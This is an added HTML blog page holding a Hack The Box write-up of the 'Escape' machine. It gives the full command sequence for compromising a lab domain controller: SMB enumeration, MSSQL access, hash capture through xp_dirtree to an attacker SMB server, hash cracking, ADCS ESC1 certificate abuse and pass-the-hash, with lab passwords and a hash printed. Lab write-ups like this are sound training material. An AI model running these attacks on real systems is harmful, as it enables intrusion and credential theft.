@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    <title>Matthew Castro - Blog</title>
+    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico" />
+    <!-- Font Awesome icons (free version)-->
+    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
+    <!-- Google fonts-->
+    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"
+        type="text/css" />
+    <link
+        href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"
+        rel="stylesheet" type="text/css" />
+    <!-- Core theme CSS (includes Bootstrap)-->
+    <link href="../../css/styles.css" rel="stylesheet" />
+    <link rel="preload" as="image" href="/assets/img/backgroud.jpg">
+    <link rel="preload" as="image" href="/assets/img/posts.jpg">
+</head>
+
+<body>
+    <!-- Navigation-->
+    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+        <div class="container px-4 px-lg-5">
+            <a class="navbar-brand" href="../../index.html">Matthew Castro</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
+                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                Menu
+                <i class="fas fa-bars"></i>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarResponsive">
+                <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../index.html">Homelab</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../reports.html">Reports</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../Write-ups.html">Write-ups</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../about.html">About</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+    <!-- Page Header-->
+    <header class="masthead" style="background-image: url('../../assets/img/posts.jpg')">
+        <div class="container position-relative px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5 justify-content-center">
+                <div class="col-md-10 col-lg-8 col-xl-7">
+                    <div class="post-heading">
+                        <h2>Escape - Hack The Box Write-up</h2>
+                        <span class="meta">
+                            Posted on February 17th, 2026
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- Post Content-->
+    <article class="mb-4">
+        <div class="container px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5 justify-content-center">
+                <div class="col-md-10 col-lg-8 col-xl-7">
+                    <p>We start by running Nmap against the provided IP to enumerate the host.  We learn that the it is a domain controller,
+                         running standard DC services such as DNS, Kerberos, RPC, LDAP, etc. We also notice an exposed MSSQL port. We learn from
+                          these results that the domain name is "sequel.htb" and the machine name is "dc".
+                    </p>
+                        <span class="grey-line">sudo nmap -sC -sV -p- -T 5 10.129.228.253</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/1.png" alt="..." />                   
+                        <p></p>
+                        We enumerate SMB shares with crackmapexec using anonymous authentication. We notice read permissions on the non-default share "Public" 
+                        <p></p>
+                        <span class="grey-line">crackmapexec smb 10.129.228.253 -u 'anonymous' -p '' --shares</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/2.png" alt="..." />                   
+                        <p></p>
+                        We list the share's contents using smbclient. We find and download a file called "SQL Server Procedures", in which we find credentials for the MSSQL service.
+                        <p></p>
+                        <span class="grey-line">smbclient  '//10.129.228.253/Public' -U ""</span>
+                        <p></p>
+                        <span class="grey-line">dir</span>
+                        <p></p>
+                        <span class="grey-line">get "SQL Server Procedures.pdf"</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/3.png" alt="..." />                   
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/4.png" alt="..." />                   
+                        <p></p>
+                        We use impacket's "mssqlclient" tool to connect to the MSSQL service with the obtained credentials.
+                        <p></p>
+                        <span class="grey-line">impacket-mssqlclient -port 1433 sequel/PublicUser:GuestUserCantWrite1@dc.sequel.htb </span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/5.png" alt="..." />                   
+                        <p></p>
+                        We force the SQL service account to authenticate to our controlled SMB server by using the xp_dirtree extended stored procedure. 
+                        <p></p>
+                        We start the SMB server on our machine:
+                        <p></p>
+                        <span class="grey-line">impacket-smbserver -smb2support fake .</span>
+                        <p></p>
+                        We force the authentication and capture the hash:
+                        <p></p>
+                        <span class="grey-line">xp_dirtree \\10.10.14.150\fake</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/6.png" alt="..." />                   
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/7.png" alt="..." />                   
+                        <p></p>
+                        We crack the hash and obtain the cleartext password for the "sql_svc" user.
+                        <p></p>
+                        <span class="grey-line">hashcat hash /usr/share/wordlists/rockyou.txt</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/8.png" alt="..." />                   
+                        <p></p>
+                        We use the new credentials to obtain WinRM access to the DC.
+                        <p></p>
+                        <span class="grey-line">evil-winrm -i sequel.htb -u sql_svc -p 'REGGIE1234ronnie'</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/9.png" alt="..." />                   
+                        <p></p>
+                        From here, we obtain the credentials “Ryan.Cooper:NuclearMosquito3” by reading the log file found in the "SQLserver" directory at the root of the C drive.
+                        <p></p>
+                        <span class="grey-line">type C:\SQLServer\Logs\ERRORLOG.BAK</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/10.png" alt="..." />                   
+                        <p></p>
+                        Using these credentials, we run certipy-ad and discover that the UserAuthentication template is vulnerable to an ESC1 attack.
+                        <p></p>
+                        <span class="grey-line">certipy-ad find -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.5.105 -vulnerable -stdout</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/11.png" alt="..." />                   
+                        <p></p>            
+                        We then request a certificate as the domain administrator and extract the hash out of the certificate.
+                        <p></p>
+                        <span class="grey-line">certipy-ad req -ca 'sequel-DC-CA' -dc-ip 10.129.5.105 -u ryan.cooper -p 'NuclearMosquito3' -template UserAuthentication -target sequel.htb -upn administrator</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/12.png" alt="..." />                   
+                        <p></p>
+                        <span class="grey-line">sudo rdate -n 10.129.5.105 && certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'sequel.htb' -dc-ip 10.129.5.105</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/13.png" alt="..." />                   
+                        <p></p>
+                        We can use the hash obtained in the previous step to authenticate via PtH to the DC and establish a WinRM session.
+                        <p></p>
+                        <span class="grey-line">evil-winrm -i sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/escape/14.png" alt="..." />                    
+
+                </div>
+            </div>
+        </div>
+    </article>
+    <!-- Bootstrap core JS-->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Core theme JS-->
+    <script src="js/scripts.js"></script>
+</body>
+
+</html>
